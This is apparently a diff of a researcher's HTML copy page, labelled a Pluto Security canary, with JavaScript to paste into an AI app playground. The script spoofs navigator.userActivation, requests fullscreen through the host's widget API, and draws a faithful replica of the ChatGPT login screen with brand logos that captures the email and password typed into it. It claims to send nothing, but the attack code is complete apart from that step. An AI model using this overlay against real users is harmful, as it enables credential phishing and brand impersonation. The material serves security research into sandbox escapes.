@@ -1,65 +1,159 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T41 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T41B clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T41 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T41B CLEAN COPY PAGE (login-screen replica) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">(function () {
-  function log(m) { try { console.log(m); } catch (e) {} }
-  log("T41 fullscreen + phishing canary " + Date.now());
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T41B - faithful ChatGPT login-screen replica overlay (Pluto Security research canary)
+// Inert by design: captures ONLY canary input typed by the researcher, echoes it
+// in-frame, stores nothing, sends nothing, makes no network calls.
+(function () {
+  var API = window.oai || window.openai || window.webplus;
+  var LOGO = "&lt;svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 41 41\" fill=\"currentColor\"&gt;&lt;path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M37.5324 16.8707C37.9808 15.5241 38.1363 14.0974 37.9886 12.6859C37.8409 11.2744 37.3934 9.91076 36.676 8.68622C35.6126 6.83404 33.9882 5.3676 32.0373 4.4985C30.0864 3.62941 27.9098 3.40259 25.8215 3.85078C24.8796 2.7893 23.7219 1.94125 22.4257 1.36341C21.1295 0.785575 19.7249 0.491269 18.3058 0.500197C16.1708 0.495044 14.0893 1.16803 12.3614 2.42214C10.6335 3.67624 9.34853 5.44666 8.6917 7.47815C7.30085 7.76286 5.98686 8.3414 4.8377 9.17505C3.68854 10.0087 2.73073 11.0782 2.02839 12.312C0.956464 14.1591 0.498905 16.2988 0.721698 18.4228C0.944492 20.5467 1.83612 22.5449 3.268 24.1293C2.81966 25.4759 2.66413 26.9026 2.81182 28.3141C2.95951 29.7256 3.40701 31.0892 4.12437 32.3138C5.18791 34.1659 6.8123 35.6322 8.76321 36.5013C10.7141 37.3704 12.8907 37.5973 14.9789 37.1492C15.9208 38.2107 17.0786 39.0587 18.3747 39.6366C19.6709 40.2144 21.0755 40.5087 22.4946 40.4998C24.6307 40.5054 26.7133 39.8321 28.4418 38.5772C30.1704 37.3223 31.4556 35.5506 32.1119 33.5179C33.5027 33.2332 34.8167 32.6547 35.9659 31.821C37.115 30.9874 38.0728 29.9178 38.7752 28.684C39.8458 26.8371 40.3023 24.6979 40.0789 22.5748C39.8556 20.4517 38.9639 18.4544 37.5324 16.8707ZM22.4978 37.8849C20.7443 37.8874 19.0459 37.2733 17.6994 36.1501C17.7601 36.117 17.8666 36.0586 17.936 36.0161L25.9004 31.4156C26.1003 31.3019 26.2663 31.137 26.3813 30.9378C26.4964 30.7386 26.5563 30.5124 26.5549 30.2825V19.0542L29.9213 20.998C29.9389 21.0068 29.9541 21.0198 29.9656 21.0359C29.977 21.052 29.9842 21.0707 29.9867 21.0902V30.3889C29.9842 32.375 29.1946 34.2791 27.7909 35.6841C26.3872 37.0892 24.4838 37.8806 22.4978 37.8849ZM6.39227 31.0064C5.51397 29.4888 5.19742 27.7107 5.49804 25.9832C5.55718 26.0187 5.66048 26.0818 5.73461 26.1244L13.699 30.7248C13.8975 30.8408 14.1233 30.902 14.3532 30.902C14.583 30.902 14.8088 30.8408 15.0073 30.7248L24.731 25.1103V28.9979C24.7321 29.0177 24.7283 29.0376 24.7199 29.0556C24.7115 29.0736 24.6988 29.0893 24.6829 29.1012L16.6317 33.7497C14.9096 34.7416 12.8643 35.0097 10.9447 34.4954C9.02506 33.9811 7.38785 32.7263 6.39227 31.0064ZM4.29707 13.6194C5.17156 12.0998 6.55279 10.9364 8.19885 10.3327C8.19885 10.4013 8.19491 10.5228 8.19491 10.6071V19.808C8.19351 20.0378 8.25334 20.2638 8.36823 20.4629C8.48312 20.6619 8.64893 20.8267 8.84863 20.9404L18.5723 26.5542L15.206 28.4979C15.1894 28.5089 15.1703 28.5155 15.1505 28.5173C15.1307 28.5191 15.1107 28.516 15.0924 28.5082L7.04046 23.8557C5.32135 22.8601 4.06716 21.2235 3.55289 19.3046C3.03862 17.3858 3.30624 15.3413 4.29707 13.6194ZM31.955 20.0556L22.2312 14.4411L25.5976 12.4981C25.6142 12.4872 25.6333 12.4805 25.6531 12.4787C25.6729 12.4769 25.6928 12.4801 25.7111 12.4879L33.7631 17.1364C34.9967 17.849 36.0017 18.8982 36.6606 20.1613C37.3194 21.4244 37.6047 22.849 37.4832 24.2684C37.3617 25.6878 36.8382 27.0432 35.9743 28.1759C35.1103 29.3086 33.9415 30.1717 32.6047 30.6641C32.6047 30.5947 32.6047 30.4733 32.6047 30.3889V21.188C32.6066 20.9586 32.5474 20.7328 32.4332 20.5338C32.319 20.3348 32.154 20.1698 31.955 20.0556ZM35.3055 15.0128C35.2464 14.9765 35.1431 14.9142 35.069 14.8717L27.1045 10.2712C26.906 10.1554 26.6803 10.0943 26.4504 10.0943C26.2206 10.0943 25.9948 10.1554 25.7963 10.2712L16.0726 15.8858V11.9982C16.0715 11.9783 16.0753 11.9585 16.0837 11.9405C16.0921 11.9225 16.1048 11.9068 16.1207 11.8949L24.1719 7.25025C25.4053 6.53903 26.8158 6.19376 28.2383 6.25482C29.6608 6.31589 31.0364 6.78077 32.2044 7.59508C33.3723 8.40939 34.2842 9.53945 34.8334 10.8531C35.3826 12.1667 35.5464 13.6095 35.3055 15.0128ZM14.2424 21.9419L10.8752 19.9981C10.8576 19.9893 10.8423 19.9763 10.8309 19.9602C10.8195 19.9441 10.8122 19.9254 10.8098 19.9058V10.6071C10.8107 9.18295 11.2173 7.78848 11.9819 6.58696C12.7466 5.38544 13.8377 4.42659 15.1275 3.82264C16.4173 3.21869 17.8524 2.99464 19.2649 3.1767C20.6775 3.35876 22.0089 3.93941 23.1034 4.85067C23.0427 4.88379 22.937 4.94215 22.8668 4.98473L14.9024 9.58517C14.7025 9.69878 14.5366 9.86356 14.4215 10.0626C14.3065 10.2616 14.2466 10.4877 14.2479 10.7175L14.2424 21.9419ZM16.071 17.9991L20.4018 15.4978L24.7325 17.9975V22.9985L20.4018 25.4983L16.071 22.9985V17.9991Z\"/&gt;&lt;/svg&gt;";
+
+  // 1) spoof activation (T11-proven path)
   try {
-    Object.defineProperty(navigator, "userActivation", { get: function () { return { isActive: true, hasBeenActive: true }; }, configurable: true });
-  } catch (e) { log("norm ERR " + e.message); }
-  function overlay() {
-    var d = document.createElement("div");
-    d.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:2147483647;display:flex;align-items:center;justify-content:center";
-    var box = document.createElement("div");
-    box.style.cssText = "width:320px;border:1px solid #ddd;border-radius:8px;padding:24px;font-family:sans-serif";
-    var warn = document.createElement("div");
-    warn.style.cssText = "background:#f00;color:#fff;font-weight:700;padding:6px;margin-bottom:12px;font-size:12px";
-    warn.textContent = "T41 RESEARCH CANARY - PHISHING DEMO - NOT A REAL LOGIN - Pluto Security";
-    var h = document.createElement("h3");
-    h.textContent = "Session expired - log in again";
-    var e1 = document.createElement("input");
-    e1.placeholder = "Email";
-    e1.style.cssText = "width:100%;padding:8px;margin:6px 0;box-sizing:border-box";
-    var e2 = document.createElement("input");
-    e2.type = "password";
-    e2.placeholder = "Password";
-    e2.style.cssText = "width:100%;padding:8px;margin:6px 0;box-sizing:border-box";
-    var btn = document.createElement("button");
-    btn.textContent = "Log in";
-    btn.style.cssText = "width:100%;padding:10px;background:#10a37f;color:#fff;border:0;border-radius:6px;margin-top:8px";
-    var out = document.createElement("div");
-    out.style.cssText = "color:#f00;font-size:12px;margin-top:10px";
-    btn.addEventListener("click", function () {
-      out.textContent = "CAPTURED BY ATTACKER CODE (canary, nothing stored): [" + e1.value + " / " + e2.value + "]";
-      log("T41 canary captured: " + e1.value + " / " + e2.value);
+    Object.defineProperty(navigator, "userActivation", {
+      get: function () { return { isActive: true, hasBeenActive: true }; },
+      configurable: true
     });
-    box.appendChild(warn); box.appendChild(h); box.appendChild(e1); box.appendChild(e2); box.appendChild(btn); box.appendChild(out);
-    d.appendChild(box);
-    document.body.appendChild(d);
+  } catch (e) {}
+
+  // 2) request fullscreen display mode (T41 path; promise result logged live)
+  var dmStatus = "requestDisplayMode: pending";
+  function setDm(t) { dmStatus = t; if (statEl) statEl.textContent = t; }
+  try {
+    if (API &amp;&amp; API.requestDisplayMode) {
+      API.requestDisplayMode({ mode: "fullscreen" }).then(
+        function (r) { setDm("requestDisplayMode: resolved " + JSON.stringify(r)); },
+        function (e) { setDm("requestDisplayMode: rejected " + e); }
+      );
+    } else { setDm("requestDisplayMode: absent"); }
+  } catch (e) { setDm("requestDisplayMode: threw " + e); }
+
+  // 3) overlay: replica login screen
+  var d = document;
+  var ov = d.createElement("div");
+  ov.id = "t41b-overlay";
+  var css = d.createElement("style");
+  css.textContent = [
+    "#t41b-overlay{position:fixed;inset:0;z-index:2147483647;background:#fff;display:flex;align-items:center;justify-content:center;font-family:'Sohne',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;color:#0d0d0d;overflow:auto}",
+    "#t41b-card{width:400px;max-width:calc(100vw - 40px);padding:12px 0;text-align:center}",
+    "#t41b-logo{color:#0d0d0d;margin:0 auto 24px;width:41px;height:41px;display:block}",
+    "#t41b-card h1{font-size:28px;font-weight:600;line-height:1.2;margin:0 0 12px;letter-spacing:-.02em}",
+    "#t41b-card p.sub{font-size:16px;color:#5d5d5d;margin:0 0 24px}",
+    "#t41b-card .lbl{display:block;text-align:left;font-size:14px;font-weight:500;margin:0 0 6px}",
+    "#t41b-card input{width:100%;box-sizing:border-box;height:52px;padding:0 16px;font-size:16px;border:1px solid rgba(13,13,13,.2);border-radius:10px;background:#fff;outline:none;margin-bottom:20px}",
+    "#t41b-card input:focus{border-color:#0d0d0d}",
+    "#t41b-card button.t41b-cta{width:100%;height:52px;background:#0d0d0d;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin:0}",
+    "#t41b-card button.t41b-cta:hover{background:#2b2b2b}",
+    "#t41b-or{display:flex;align-items:center;gap:12px;margin:20px 0;color:#8f8f8f;font-size:14px}",
+    "#t41b-or:before,#t41b-or:after{content:'';flex:1;height:1px;background:#e5e5e5}",
+    "#t41b-card button.t41b-sso{width:100%;height:52px;background:#fff;border:1px solid rgba(13,13,13,.2);border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;color:#0d0d0d}",
+    "#t41b-card button.t41b-sso:hover{background:#f7f7f7}",
+    "#t41b-foot{font-size:14px;color:#5d5d5d;margin-top:24px}",
+    "#t41b-foot a{color:#0d0d0d;text-decoration:underline}",
+    "#t41b-terms{font-size:12px;color:#8f8f8f;margin-top:16px;line-height:1.5}",
+    "#t41b-cap{border:2px solid #d00;border-radius:10px;padding:16px;text-align:left;font-family:Menlo,Consolas,monospace;font-size:13px;background:#fff5f5;color:#300}",
+    "#t41b-cap b{font-size:14px}",
+    "#t41b-corner{position:fixed;right:8px;bottom:8px;z-index:2147483647;font-family:Menlo,monospace;font-size:10px;color:#d00;background:rgba(255,255,255,.9);padding:2px 6px;border:1px solid #d00;border-radius:4px}",
+    "#t41b-corner button{margin-left:6px;cursor:pointer;font-size:10px;font-family:inherit}",
+    "#t41b-stat{position:fixed;left:8px;bottom:8px;z-index:2147483647;font-family:Menlo,monospace;font-size:10px;color:#d00;background:rgba(255,255,255,.9);padding:2px 6px;border:1px solid #d00;border-radius:4px;max-width:60vw}"
+  ].join("");
+  ov.appendChild(css);
+
+  function el(html) {
+    var t = d.createElement("div");
+    t.innerHTML = html;
+    return t.firstElementChild;
   }
-  setTimeout(function () {
-    var api = window.oai || window.openai || window.webplus;
-    if (!api) { log("no api"); overlay(); return; }
-    try {
-      var p = api.requestDisplayMode({ mode: "fullscreen" });
-      log("displayMode sent: " + String(p && p.then ? "promise" : p));
-      if (p && p.then) { p.then(function (v) { log("resolved: " + JSON.stringify(v)); }, function (e) { log("rejected " + String(e)); }); }
-    } catch (e) { log("sync ERR: " + e.message); }
-    setTimeout(overlay, 1500);
-    log("T41 done - overlay in 1.5s");
-  }, 800);
+  function ssoBtn(name, icon) {
+    return '&lt;button class="t41b-sso" type="button"&gt;' + icon + " Continue with " + name + "&lt;/button&gt;";
+  }
+  var gSvg = '&lt;svg width="18" height="18" viewBox="0 0 18 18"&gt;&lt;path fill="#4285F4" d="M17.64 9.2c0-.64-.06-1.25-.16-1.84H9v3.48h4.84a4.14 4.14 0 0 1-1.8 2.72v2.26h2.92c1.7-1.57 2.68-3.88 2.68-6.62z"/&gt;&lt;path fill="#34A853" d="M9 18c2.43 0 4.47-.8 5.96-2.18l-2.92-2.26c-.8.54-1.84.86-3.04.86-2.34 0-4.32-1.58-5.03-3.7H.96v2.32A9 9 0 0 0 9 18z"/&gt;&lt;path fill="#FBBC05" d="M3.97 10.72a5.4 5.4 0 0 1 0-3.44V4.96H.96a9 9 0 0 0 0 8.08l3.01-2.32z"/&gt;&lt;path fill="#EA4335" d="M9 3.58c1.32 0 2.5.45 3.43 1.35l2.58-2.58C13.46.9 11.43 0 9 0A9 9 0 0 0 .96 4.96l3.01 2.32C4.68 5.16 6.66 3.58 9 3.58z"/&gt;&lt;/svg&gt;';
+  var mSvg = '&lt;svg width="18" height="18" viewBox="0 0 18 18"&gt;&lt;rect x="0" y="0" width="8.5" height="8.5" fill="#F25022"/&gt;&lt;rect x="9.5" y="0" width="8.5" height="8.5" fill="#7FBA00"/&gt;&lt;rect x="0" y="9.5" width="8.5" height="8.5" fill="#00A4EF"/&gt;&lt;rect x="9.5" y="9.5" width="8.5" height="8.5" fill="#FFB900"/&gt;&lt;/svg&gt;';
+  var aSvg = '&lt;span style="font-size:18px;line-height:1"&gt;\uF8FF&lt;/span&gt;';
+
+  var card = d.createElement("div");
+  card.id = "t41b-card";
+  ov.appendChild(card);
+
+  function renderEmailStep() {
+    card.innerHTML = "";
+    card.appendChild(el('&lt;span id="t41b-logo"&gt;' + LOGO + "&lt;/span&gt;"));
+    card.appendChild(el("&lt;h1&gt;Welcome back&lt;/h1&gt;"));
+    card.appendChild(el('&lt;p class="sub"&gt;Enter your email address to log in.&lt;/p&gt;'));
+    card.appendChild(el('&lt;label class="lbl" for="t41b-em"&gt;Email address&lt;/label&gt;'));
+    var em = d.createElement("input");
+    em.id = "t41b-em"; em.type = "email"; em.placeholder = ""; em.autocomplete = "username";
+    card.appendChild(em);
+    var go = d.createElement("button");
+    go.className = "t41b-cta"; go.type = "button"; go.textContent = "Continue";
+    go.onclick = function () { if (em.value.trim()) renderPwStep(em.value.trim()); };
+    card.appendChild(go);
+    card.appendChild(el('&lt;div id="t41b-or"&gt;OR&lt;/div&gt;'));
+    card.appendChild(el(ssoBtn("Google", gSvg)));
+    card.appendChild(el(ssoBtn("Microsoft", mSvg)));
+    card.appendChild(el(ssoBtn("Apple", aSvg)));
+    card.appendChild(el('&lt;div id="t41b-foot"&gt;Don\'t have an account? &lt;a href="javascript:void 0"&gt;Sign up&lt;/a&gt;&lt;/div&gt;'));
+    card.appendChild(el('&lt;div id="t41b-terms"&gt;By continuing, you agree to OpenAI\u2019s &lt;a href="javascript:void 0"&gt;Terms of Use&lt;/a&gt; and &lt;a href="javascript:void 0"&gt;Privacy Policy&lt;/a&gt;.&lt;/div&gt;'));
+    em.focus();
+  }
+
+  function renderPwStep(email) {
+    card.innerHTML = "";
+    card.appendChild(el('&lt;span id="t41b-logo"&gt;' + LOGO + "&lt;/span&gt;"));
+    card.appendChild(el("&lt;h1&gt;Enter your password&lt;/h1&gt;"));
+    card.appendChild(el('&lt;p class="sub"&gt;Welcome back! Enter your password to log in.&lt;/p&gt;'));
+    card.appendChild(el('&lt;label class="lbl" for="t41b-pw"&gt;Password&lt;/label&gt;'));
+    var pw = d.createElement("input");
+    pw.id = "t41b-pw"; pw.type = "password"; pw.autocomplete = "current-password";
+    card.appendChild(pw);
+    var go = d.createElement("button");
+    go.className = "t41b-cta"; go.type = "button"; go.textContent = "Continue";
+    go.onclick = function () { if (pw.value) renderCapture(email, pw.value); };
+    card.appendChild(go);
+    card.appendChild(el('&lt;div id="t41b-foot"&gt;&lt;a href="javascript:void 0"&gt;Forgot password?&lt;/a&gt;&lt;/div&gt;'));
+    pw.focus();
+  }
+
+  function renderCapture(email, pass) {
+    card.innerHTML = "";
+    card.appendChild(el('&lt;span id="t41b-logo"&gt;' + LOGO + "&lt;/span&gt;"));
+    var cap = d.createElement("div");
+    cap.id = "t41b-cap";
+    cap.innerHTML =
+      "&lt;b&gt;T41B \u2014 CREDENTIALS CAPTURED BY ATTACKER CODE&lt;/b&gt;&lt;br&gt;" +
+      "(research canary \u2014 nothing stored, nothing sent, no network calls)&lt;br&gt;&lt;br&gt;" +
+      "email&amp;nbsp;&amp;nbsp;&amp;nbsp;: " + JSON.stringify(email).replace(/&lt;/g, "&amp;lt;") + "&lt;br&gt;" +
+      "password: " + JSON.stringify(pass).replace(/&lt;/g, "&amp;lt;");
+    card.appendChild(cap);
+  }
+
+  var corner = d.createElement("div");
+  corner.id = "t41b-corner";
+  corner.innerHTML = "RESEARCH CANARY \u2014 Pluto Security (inert demo)";
+  var closeBtn = d.createElement("button");
+  closeBtn.textContent = "[x] close";
+  closeBtn.onclick = function () { ov.remove(); statEl.remove(); corner.remove(); };
+  corner.appendChild(closeBtn);
+
+  var statEl = d.createElement("div");
+  statEl.id = "t41b-stat";
+  statEl.textContent = dmStatus;
+
+  d.body.appendChild(ov);
+  d.body.appendChild(corner);
+  d.body.appendChild(statEl);
+  renderEmailStep();
 })();
 </pre>
 <script>
-document.getElementById("copy").addEventListener("click", function () {
-  var t = document.getElementById("code").textContent;
-  navigator.clipboard.writeText(t).then(function () {
-    document.getElementById("copy").textContent = "Copied - now paste in the playground editor and click Run";
+document.getElementById("copy").onclick = function () {
+  navigator.clipboard.writeText(document.getElementById("code").textContent).then(function () {
+    document.getElementById("copy").textContent = "COPIED - paste it in the playground editor";
   });
-});
+};
 </script>
 </body>
 </html>
